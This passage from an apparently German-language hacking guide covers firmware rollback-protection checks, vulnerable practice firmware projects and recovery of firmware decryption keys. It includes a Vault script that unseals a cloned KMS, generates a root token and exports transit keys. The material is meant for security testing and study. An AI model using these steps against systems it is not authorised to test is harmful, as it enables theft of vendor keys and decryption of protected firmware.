* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfung im ROM-Code)?
* Erzwingt der **Bootloader dasselbe Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Switch zum Reboot gezwungen, oder sind spätere Update-/Löschroutinen weiterhin in derselben Session erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Flows dieselbe Validierungslogik wieder?

> 💡  Wenn eines der oben genannten Elemente fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, können die folgenden Projekte mit verwundbarer Firmware als Ausgangspunkt verwendet werden.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor jeglichem Brute-Forcing zunächst eine Container-Triage durchgeführt werden:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` bedeutet üblicherweise das OpenSSL-`enc`-Format: Die nächsten 8 Bytes sind der Salt, die verbleibenden Bytes der Ciphertext.
- Ein Base64-Feld, das dekodiert genau `256` Bytes ergibt, ist ein starker Hinweis darauf, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort/einen zufälligen Session-Key kapselt.
- Separates PGP-Material in derselben Datei schützt häufig nur die Authentizität; man sollte nicht davon ausgehen, dass es sich dabei um den Vertraulichkeitsmechanismus handelt.

Wenn die statische Suche nach Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** untersucht werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater / das Management-Binary dekompilieren und nachverfolgen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entpackt und welchen logischen Schlüsselnamen er anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Dateien und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery Keys, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte als gleichwertig zu Material privater Schlüssel behandeln.

Wenn das Appliance das originale Vault-Binary und Storage-Backend enthält, ist das Replay dieser Umgebung gewöhnlich einfacher, als die internen Abläufe von Vault neu zu implementieren:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Mit root auf dem geklonten KMS:

- Transit keys nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit dem exakt vom KMS verwendeten Padding-/Hash-Paar testen. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene Standard-OAEP-Entschlüsselung **beweisen nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Flows verwenden OAEP mit SHA-256, während gängige Libraries standardmäßig SHA-1 verwenden.
- Wenn der Payload mit `Salted__` beginnt, die OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, auf älteren Appliances häufig MD5), bevor eine AES-CBC-Entschlüsselung versucht wird.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **Die operativen Schlüssel auf Appliance-Seite wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Training und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Fähigkeiten auf Senior-Level, Autonomie auf Junior-Level](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in aufgegebener Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Umgehung des Anti-Downgrade-Schutzes](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
